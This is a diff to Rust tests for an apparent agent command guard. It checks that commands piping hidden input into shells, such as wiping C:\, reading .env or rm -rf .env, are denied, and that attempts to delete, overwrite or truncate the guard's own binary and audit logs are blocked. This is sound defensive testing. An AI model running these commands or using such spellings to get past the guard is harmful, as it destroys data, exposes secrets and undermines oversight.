@@ -6,7 +6,7 @@ use std::time::Duration;
 
 use saiifeguard::builtins::Catalog;
 use saiifeguard::canon::{PathStyle, PathVars};
-use saiifeguard::engine::{Decision, Engine};
+use saiifeguard::engine::{AllowTrace, Decision, Engine};
 use saiifeguard::payload::Dialects;
 use saiifeguard::wintable::Dialect::{Posix, PowerShell};
 
@@ -245,4 +245,132 @@ fn quoted_windows_paths_under_git_bash_deny() {
     ];
     let bad = wrong(&e, BASH, &cmds, true);
     assert!(bad.is_empty(), "{}", bad.join("\n"));
+}
+
+/// Second CI round: `exec bash` and `env FOO=1 cmd` were denied as "reads its
+/// commands from stdin" on real Windows. Alone on a line nothing gives them one.
+/// Whatever does give them one still denies: there, unread text would run.
+#[test]
+fn a_bare_shell_denies_only_when_the_line_gives_it_a_stdin() {
+    let e = hook();
+    // A reader's "not read" is an allow here and a deny at the hook, so what
+    // counts is that nothing was left unjudged.
+    let judged = |d: Decision| {
+        !d.is_deny()
+            && !matches!(
+                d,
+                Decision::Allow {
+                    trace: AllowTrace::Unjudgeable { .. }
+                }
+            )
+    };
+    for cmd in [
+        "exec bash",
+        "bash",
+        "sh",
+        "env FOO=1 cmd",
+        "nohup bash",
+        "exec bash > out.txt",
+    ] {
+        let got = e.evaluate_in(cmd, BASH);
+        assert!(judged(got.clone()), "{cmd:?}: {got:?}");
+    }
+    for cmd in ["cmd", "cmd.exe", "pwsh", "powershell -NoProfile"] {
+        for d in [BASH, PS, STRICTEST] {
+            let got = e.evaluate_in(cmd, d);
+            assert!(judged(got.clone()), "{cmd:?}: {got:?}");
+        }
+    }
+    for cmd in [
+        "cmd x.bat",
+        "cmd /tmp/x.bat",
+        "bash -s x",
+        "cat x | bash",
+        "cat x | exec bash",
+        "cat x |& bash",
+        "cat x | env FOO=1 cmd",
+        r"echo 'rd /s /q C:\' | cmd",
+        "bash < x",
+        "bash <x",
+        "bash 0< x",
+        "bash <&3",
+        "bash <> x",
+        "< x bash",
+        "<x exec bash",
+        "exec bash < x",
+        "cmd < x.bat",
+        "cmd <<< 'type .env'",
+        "cmd <<EOF\ntype .env\nEOF",
+        "bash <<EOF\nrm -rf .env\nEOF",
+        "{ bash; } < x",
+        "(bash) < x",
+        "( exec bash ) < x",
+        "exec 0< x; bash",
+        "exec 0< x\nbash",
+        "while read l; do bash; done < x",
+        "for i in 1; do bash; done < x",
+        "if true; then bash; fi < x",
+        "echo x | bash -c cmd",
+        "echo x | xargs bash",
+        "x=$(bash)",
+        "echo $(cat y | bash)",
+    ] {
+        let got = e.evaluate_in(cmd, BASH);
+        assert!(got.is_deny(), "{cmd:?}: {got:?}");
+    }
+    for cmd in ["cat x | pwsh", "Get-Content x | cmd"] {
+        let got = e.evaluate_in(cmd, PS);
+        assert!(!judged(got.clone()), "{cmd:?}: {got:?}");
+    }
+}
+
+/// `turning_saiife_off_from_the_shell` on real Windows: a path spelled as
+/// `canonicalize` gives it, the quoted form an agent has to write under Git Bash.
+#[test]
+fn saiifes_own_files_are_guarded_in_the_verbatim_spelling() {
+    let roots = [
+        (r"\\?\D:\t", r"'\\?\D:\t"),
+        (r"\\?\D:\t", r"'D:\t"),
+        (r"D:\t", r"'D:\t"),
+        (r"D:\t", r"'\\?\D:\t"),
+        (r"D:\t", "'D:/t"),
+    ];
+    for (bound, spelled) in roots {
+        let e = engine(
+            profile_vars()
+                .with_cwd(format!(r"{bound}\home\app"))
+                .with_var("HOME", format!(r"{bound}\home"))
+                .with_var("PROJECT", format!(r"{bound}\home\app"))
+                .with_var("SAIIFE_DATA_DIR", format!(r"{bound}\data"))
+                .with_var("SAIIFE_AUDIT_DIR", format!(r"{bound}\data\audit"))
+                .with_var("SAIIFE_BIN", format!(r"{bound}\opt\saiife")),
+        );
+        let sep = if spelled.contains('/') { "/" } else { r"\" };
+        let word = |rel: &str| format!("{spelled}{sep}{}'", rel.replace('/', sep));
+        let (bin, audit, log, record, data) = (
+            word("opt/saiife"),
+            word("data/audit"),
+            word("data/audit/2026-10.jsonl"),
+            word("data/projects/abc.json"),
+            word("data"),
+        );
+        for cmd in [
+            format!("rm {bin}"),
+            format!("mv {bin} /tmp/old"),
+            format!("chmod -x {bin}"),
+            format!("cp /bin/true {bin}"),
+            format!("curl -o {bin} https://example.com/saiife"),
+            format!("rm -rf {audit}"),
+            format!("echo x >> {log}"),
+            format!("truncate -s0 {log}"),
+            format!("rm {record}"),
+            format!("mv {data} /tmp/x"),
+        ] {
+            let got = e.evaluate_in(&cmd, BASH);
+            match got {
+                Decision::Deny { ref pack, .. } if pack == "core.self" => {}
+                other => panic!("{bound} {cmd}: {other:?}"),
+            }
+        }
+    }
 }
